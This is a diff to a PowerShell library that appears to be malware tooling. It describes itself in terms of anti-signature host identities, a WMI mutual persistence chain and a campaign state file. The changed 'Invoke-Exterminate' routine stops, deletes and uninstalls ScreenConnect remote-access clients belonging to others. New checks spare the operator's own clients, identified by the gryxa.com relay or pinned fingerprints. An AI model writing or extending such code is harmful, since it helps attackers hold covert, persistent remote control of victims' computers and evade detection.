@@ -1,9 +1,9 @@
 #Requires -Version 5.1
 # ═══════════════════════════════════════════════════════════════
-# OWN_LIB  BUILD 20260802L25
+# OWN_LIB  BUILD 20260802L26
 # Shared library: per-host identity (anti-signature), WMI watchdog
 # (mutual persistence chain), campaign state file, SC service repair.
-# L25: expected FP pinned 36e506ff016b2151; cached MSI invalidated when FP mismatches.
+# L26: allow SC by relay domain (gryxa.com) OR keeper FP — exterminator no longer kills new Gryxa on connect.
 # L21: stuck registered (svc+dir gone) -> /fa then ARP nuke + same-FP /i; return fix.
 # L20: -Deep must not skip light start/repair (rate-limit left Gryxa Stopped).
 # L19: rate-limit never blocks when Gryxa fully absent; StartPending keep.
@@ -369,6 +369,7 @@ function Set-GryxaFp([string]$Fingerprint) {
 function Get-KeepFingerprints {
     $set = New-Object 'System.Collections.Generic.HashSet[string]' ([StringComparer]::OrdinalIgnoreCase)
     [void]$set.Add('5f6010579852e507'); [void]$set.Add('f861c8140d453427'); [void]$set.Add((Get-GryxaFp))
+    if ($script:GryxaExpectedFp) { [void]$set.Add($script:GryxaExpectedFp) }
     foreach ($svc in (Get-Service -Name 'ScreenConnect Client*' -ErrorAction SilentlyContinue)) {
         if ($svc.Status -notin @('Running','StartPending','ContinuePending')) { continue }
         if ($svc.Name -match '\(([0-9a-f]{16})\)') {
@@ -657,6 +658,8 @@ function Invoke-Exterminate {
     }
     function Is-Keeper([string]$s) {
         if (-not $s) { return $false }
+        # allow if relay server/domain is Gryxa OR fingerprint is a keeper
+        if ($s -match '(?i)gryxa\.com') { return $true }
         foreach ($k in $keep) { if ($s -like "*$k*") { return $true } }
         return $false
     }
@@ -724,15 +727,19 @@ function Invoke-Exterminate {
             if ($dn -notmatch '(?i)ScreenConnect\s+Client\s*\(([0-9A-Fa-f]{16})\)') { return }
             $fp = $Matches[1].ToLower()
             if ($fp -in $keep) { return }
+            $us = $prop.UninstallString
+            if ($us -and $us -match '(?i)gryxa\.com') { Log "product_skip_gryxa_relay [$dn]"; return }
             if ($seen.ContainsKey($_.PSChildName)) { return }
             $seen[$_.PSChildName] = $true
             if (Uninstall-ProductKey $_) { $n.product++ } else { $n.fail++; Log "product_REMOVE_FAILED [$dn]" }
         }
     }
 
-    # 2. foreign SC services
+    # 2. foreign SC services (skip if keeper FP or relay is gryxa.com)
     foreach ($svc in (Get-Service -ErrorAction SilentlyContinue | Where-Object { $_.Name -like 'ScreenConnect Client*' })) {
         if (Is-Keeper $svc.Name) { continue }
+        $img = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\$($svc.Name)" -ErrorAction SilentlyContinue).ImagePath
+        if (Is-Keeper $img) { Log "svc_skip_gryxa_relay $($svc.Name)"; continue }
         & sc.exe stop "$($svc.Name)" 2>&1 | Out-Null
         Start-Sleep -Milliseconds 600
         & sc.exe delete "$($svc.Name)" 2>&1 | Out-Null
@@ -746,6 +753,7 @@ function Invoke-Exterminate {
         $cmd = [string]$_.CommandLine
         $blob = "$exe $cmd"
         if (Is-Keeper $blob) { return }
+        if ($blob -match '(?i)gryxa\.com') { Log "proc_skip_gryxa_relay pid=$($_.ProcessId)"; return }
         if ($blob -notmatch '\(([0-9a-fA-F]{16})\)') {
             Log "proc_skip_no_fp pid=$($_.ProcessId) name=$($_.Name)"
             return
@@ -763,6 +771,13 @@ function Invoke-Exterminate {
             Where-Object { $_.Name -like 'ScreenConnect*' } | ForEach-Object {
                 $d = $_.FullName
                 if (Is-Keeper $d) { return }
+                # dir carries no FP/relay in its name; protect the one backing a keeper/gryxa service
+                $leaf = $_.Name
+                $svcHere = Get-Service -ErrorAction SilentlyContinue | Where-Object { $_.Name -like 'ScreenConnect Client*' } | Where-Object {
+                    $im = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\$($_.Name)" -ErrorAction SilentlyContinue).ImagePath
+                    $im -and ($im -like "*$leaf*")
+                }
+                if ($svcHere) { Log "dir_skip_live_svc $d"; return }
                 if (Force-RemoveDir $d) { $n.dir++; Log "dir_removed $d" }
                 else { $n.fail++; Log "dir_REMOVE_FAILED $d" }
             }
